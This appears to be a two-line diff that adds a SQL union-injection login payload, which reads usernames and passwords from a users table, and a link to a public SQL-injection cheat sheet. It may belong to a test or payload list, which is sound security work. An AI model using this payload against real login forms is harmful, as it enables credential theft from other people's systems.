@@ -1,0 +1,2 @@
+login=user1' UNION SELECT username,password FROM users; -- -&password='
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections
